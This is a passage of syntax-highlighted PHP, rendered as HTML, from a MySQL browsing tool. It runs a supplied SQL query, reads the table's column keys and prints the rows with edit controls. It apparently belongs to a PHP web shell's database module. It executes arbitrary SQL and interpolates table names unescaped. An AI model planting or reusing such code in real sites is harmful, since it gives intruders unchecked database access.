<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> (!$<span style="color: #ffeead;">tablename</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">sql_line</span> = <span style="color: #ffffff; background-color: #002451;">str_replace(array(</span><span style="color: #99ffff;">"\r"</span>, <span style="color: #99ffff;">"\n"</span><span style="text-decoration: underline;">, </span><span style="color: #99ffff; text-decoration: underline;">"\t"</span><span style="text-decoration: underline;">), </span><span style="color: #ffffff; background-color: #002451; text-decoration: underline;">array(</span><span style="color: #99ffff; text-decoration: underline;">' '</span><span style="text-decoration: underline;">, </span><span style="color: #99ffff; text-decoration: underline;">' '</span><span style="text-decoration: underline;">, </span><span style="color: #99ffff; text-decoration: underline;">' '</span><span style="text-decoration: underline;">), </span><span style="color: #ffffff; background-color: #002451; text-decoration: underline;">trim(htmlspecialchars(</span><span style="text-decoration: underline;">$</span><span style="color: #ffeead; text-decoration: underline;">query</span><span style="text-decoration: underline;">)));</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">sql_line</span> = <span style="color: #ffffff; background-color: #002451;">preg_replace(</span><span style="color: #99ffff;">"/\/\*[^(\*\/)]</span><span style="color: #99ffff; text-decoration: underline;">*\*\//i"</span><span style="text-decoration: underline;">, </span><span style="color: #99ffff; text-decoration: underline;">" "</span><span style="text-decoration: underline;">, $</span><span style="color: #ffeead; text-decoration: underline;">sql_line</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">preg_match_all(</span><span style="color: #99ffff;">"/from\s+`{0,1}([\w]+)`{0</span><span style="color: #99ffff; text-decoration: underline;">,1}\s+/i"</span><span style="text-decoration: underline;">,$</span><span style="color: #ffeead; text-decoration: underline;">sql_line</span><span style="text-decoration: underline;">,$</span><span style="color: #ffeead; text-decoration: underline;">matches</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">tablename</span> = $<span style="color: #ffeead;">matches</span>[<span style="color: #ffffff; background-color: #002451;">1</span>][<span style="color: #ffffff; background-color: #002451;">0</span>];
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }

<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #7285b7; font-style: italic;">/*********************</span><span style="color: #7285b7; font-style: italic;">/</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">getfield</span> = <span style="color: #ffffff; background-color: #002451;">q(</span><span style="color: #99ffff;">"SHOW COLUMNS FROM $tablename"</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">rowdb</span> = <span style="color: #ffffff; background-color: #002451;">array(</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">keyfied</span> = <span style="color: #99ffff;">''</span>; <span style="color: #7285b7; font-style: italic;">//</span><span style="color: #7285b7; font-style: italic;">&#20027;&#38190;&#23383;&#27573;</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">while</span>($<span style="color: #ffeead;">row</span> = @<span style="color: #ffffff; background-color: #002451;">mysql_fetch_assoc(</span>$<span style="color: #ffeead;">getfield</span>)) <span style="text-decoration: underline;">{</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">rowdb</span>[$<span style="color: #ffeead;">row</span>[<span style="color: #99ffff;">'Field'</span>]][<span style="color: #99ffff;">'Key'</span>] = $<span style="color: #ffeead;">row</span>[<span style="color: #99ffff;">'Key</span><span style="color: #99ffff; text-decoration: underline;">'</span><span style="text-decoration: underline;">];</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">rowdb</span>[$<span style="color: #ffeead;">row</span>[<span style="color: #99ffff;">'Field'</span>]][<span style="color: #99ffff;">'Extra'</span>] = $<span style="color: #ffeead;">row</span>[<span style="color: #99ffff;">'E</span><span style="color: #99ffff; text-decoration: underline;">xtra'</span><span style="text-decoration: underline;">];</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> ($<span style="color: #ffeead;">row</span>[<span style="color: #99ffff;">'Key'</span>] == <span style="color: #99ffff;">'UNI'</span> || $<span style="color: #ffeead;">row</span>[<span style="color: #99ffff;">'Key'</span>] <span style="text-decoration: underline;">== </span><span style="color: #99ffff; text-decoration: underline;">'PRI'</span><span style="text-decoration: underline;">) {</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">keyfied</span> = $<span style="color: #ffeead;">row</span>[<span style="color: #99ffff;">'Field'</span>];
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #7285b7; font-style: italic;">/*********************</span><span style="color: #7285b7; font-style: italic;">/</span><span style="color: #ff9da4; background-color: #003f8e;">                     </span><span style="color: #ff9da4; background-color: #003f8e; text-decoration: underline;">            </span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #7285b7; font-style: italic;">//</span><span style="color: #7285b7; font-style: italic;">&#30452;&#25509;&#27983;&#35272;&#34920;&#25353;&#29031;&#20027;&#38190;&#38477;&#24207;&#25490;&#21015;</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> ($<span style="color: #ffeead;">keyfied</span> &amp;&amp; <span style="color: #ffffff; background-color: #002451;">strtolower(substr(</span>$<span style="color: #ffeead;">query</span>,<span style="color: #ffffff; background-color: #002451;">0</span>,<span style="color: #ffffff; background-color: #002451;">1</span><span style="color: #ffffff; background-color: #002451; text-decoration: underline;">3</span><span style="text-decoration: underline;">)) == </span><span style="color: #99ffff; text-decoration: underline;">'select * from'</span><span style="text-decoration: underline;">) {</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">query</span> = <span style="color: #ffffff; background-color: #002451;">str_replace(</span><span style="color: #99ffff;">" LIMIT "</span>, <span style="color: #99ffff;">" order </span><span style="color: #99ffff; text-decoration: underline;">by $keyfied DESC LIMIT "</span><span style="text-decoration: underline;">, $</span><span style="color: #ffeead; text-decoration: underline;">query</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }

<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">result</span> = <span style="color: #ffffff; background-color: #002451;">q(</span>$<span style="color: #ffeead;">query</span>);

<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span>$<span style="color: #ffeead;">multipage</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;table border="0" cellpadding="3" cellspa</span><span style="color: #99ffff; text-decoration: underline;">cing="0"&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;tr class="head"&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> ($<span style="color: #ffeead;">allowedit</span>) <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;td&gt;Action&lt;/td&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">fieldnum</span> = @<span style="color: #ffffff; background-color: #002451;">mysql_num_fields(</span>$<span style="color: #ffeead;">result</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">for</span>($<span style="color: #ffeead;">i</span>=<span style="color: #ffffff; background-color: #002451;">0</span>;$<span style="color: #ffeead;">i</span>&lt;$<span style="color: #ffeead;">fieldnum</span>;$<span style="color: #ffeead;">i</span>++){
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">name</span> = @<span style="color: #ffffff; background-color: #002451;">mysql_field_name(</span>$<span style="color: #ffeead;">result</span>, $<span style="color: #ffeead;">i</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">type</span> = @<span style="color: #ffffff; background-color: #002451;">mysql_field_type(</span>$<span style="color: #ffeead;">result</span>, $<span style="color: #ffeead;">i</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">len</span> = @<span style="color: #ffffff; background-color: #002451;">mysql_field_len(</span>$<span style="color: #ffeead;">result</span>, $<span style="color: #ffeead;">i</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">"&lt;td nowrap&gt;$name&lt;br&gt;&lt;span&gt;$type($len)</span><span style="color: #99ffff; text-decoration: underline;">"</span><span style="text-decoration: underline;">.(($</span><span style="color: #ffeead; text-decoration: underline;">rowdb</span><span style="text-decoration: underline;">[$</span><span style="color: #ffeead; text-decoration: underline;">name</span><span style="text-decoration: underline;">][</span><span style="color: #99ffff; text-decoration: underline;">'Key'</span><span style="text-decoration: underline;">] == </span><span style="color: #99ffff; text-decoration: underline;">'UNI'</span><span style="text-decoration: underline;"> || $</span><span style="color: #ffeead; text-decoration: underline;">rowdb</span><span style="text-decoration: underline;">[$</span><span style="color: #ffeead; text-decoration: underline;">name</span><span style="text-decoration: underline;">][</span><span style="color: #99ffff; text-decoration: underline;">'Key'</span><span style="text-decoration: underline;">] == </span><span style="color: #99ffff; text-decoration: underline;">'PRI'</span><span style="text-decoration: underline;">) ? </span><span style="color: #99ffff; text-decoration: underline;">'&lt;b&gt; - PRIMARY&lt;/b&gt;'</span><span style="text-decoration: underline;"> : </span><span style="color: #99ffff; text-decoration: underline;">''</span><span style="text-decoration: underline;">).($</span><span style="color: #ffeead; text-decoration: underline;">rowdb</span><span style="text-decoration: underline;">[$</span><span style="color: #ffeead; text-decoration: underline;">name</span><span style="text-decoration: underline;">][</span><span style="color: #99ffff; text-decoration: underline;">'Extra'</span><span style="text-decoration: underline;">] == </span><span style="color: #99ffff; text-decoration: underline;">'auto_increment'</span><span style="text-decoration: underline;"> ? </span><span style="color: #99ffff; text-decoration: underline;">'&lt;b&gt; - Auto&lt;/b&gt;'</span><span style="text-decoration: underline;"> : </span><span style="color: #99ffff; text-decoration: underline;">''</span><span style="text-decoration: underline;">).</span><span style="color: #99ffff; text-decoration: underline;">"&lt;/span&gt;&lt;/td&gt;"</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;/tr&gt;'</span>);

<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">while</span>($<span style="color: #ffeead;">mn</span> = @<span style="color: #ffffff; background-color: #002451;">mysql_fetch_assoc(</span>$<span style="color: #ffeead;">result</span>)){
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">thisbg</span> = <span style="color: #ffffff; background-color: #002451;">bg(</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;tr class="'</span>.$<span style="color: #ffeead;">thisbg</span>.<span style="color: #99ffff;">'" onmouseover="</span><span style="color: #99ffff; text-decoration: underline;">this.className=\'focus\';" onmouseout="this.className=\''</span><span style="text-decoration: underline;">.$</span><span style="color: #ffeead; text-decoration: underline;">thisbg</span><span style="text-decoration: underline;">.</span><span style="color: #99ffff; text-decoration: underline;">'\';"&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">where</span> = $<span style="color: #ffeead;">tmp</span> = $<span style="color: #ffeead;">b1</span> = <span style="color: #99ffff;">''</span>;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #7285b7; font-style: italic;">//</span><span style="color: #7285b7; font-style: italic;">&#36873;&#21462;&#26465;&#20214;&#23383;&#27573;&#29992;</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">foreach</span>($<span style="color: #ffeead;">mn</span> <span style="color: #d1f1a9;">as</span> $<span style="color: #ffeead;">key</span>=&gt;$<span style="color: #ffeead;">inside</span>){
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> ($<span style="color: #ffeead;">inside</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #7285b7; font-style: italic;">//</span><span style="color: #7285b7; font-style: italic;">&#26597;&#25214;&#20027;&#38190;&#12289;&#21807;&#19968;&#23646;&#24615;&#12289;&#33258;&#21160;&#22686;&#21152;&#30340;&#23383;&#27573;&#65292;&#25214;&#21040;&#23601;&#20572;&#27490;&#65292;&#21542;&#21017;&#32452;&#21512;&#25152;&#26377;</span><span style="color: #7285b7; font-style: italic; text-decoration: underline;">&#23383;&#27573;&#20316;&#20026;&#26465;&#20214;&#12290;</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> ($<span style="color: #ffeead;">rowdb</span>[$<span style="color: #ffeead;">key</span>][<span style="color: #99ffff;">'Key'</span>] == <span style="color: #99ffff;">'UNI'</span><span style="text-decoration: underline;"> || $</span><span style="color: #ffeead; text-decoration: underline;">rowdb</span><span style="text-decoration: underline;">[$</span><span style="color: #ffeead; text-decoration: underline;">key</span><span style="text-decoration: underline;">][</span><span style="color: #99ffff; text-decoration: underline;">'Extra'</span><span style="text-decoration: underline;">] == </span><span style="color: #99ffff; text-decoration: underline;">'auto_increment'</span><span style="text-decoration: underline;"> || $</span><span style="color: #ffeead; text-decoration: underline;">rowdb</span><span style="text-decoration: underline;">[$</span><span style="color: #ffeead; text-decoration: underline;">key</span><span style="text-decoration: underline;">][</span><span style="color: #99ffff; text-decoration: underline;">'Key'</span><span style="text-decoration: underline;">] == </span><span style="color: #99ffff; text-decoration: underline;">'PRI'</span><span style="text-decoration: underline;">) {</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">where</span> = $<span style="color: #ffeead;">key</span>.<span style="color: #99ffff;">"='"</span>.<span style="color: #ffffff; background-color: #002451;">addslashe</span><span style="color: #ffffff; background-color: #002451; text-decoration: underline;">s(</span><span style="text-decoration: underline;">$</span><span style="color: #ffeead; text-decoration: underline;">inside</span><span style="text-decoration: underline;">).</span><span style="color: #99ffff; text-decoration: underline;">"'"</span><span style="text-decoration: underline;">;</span>
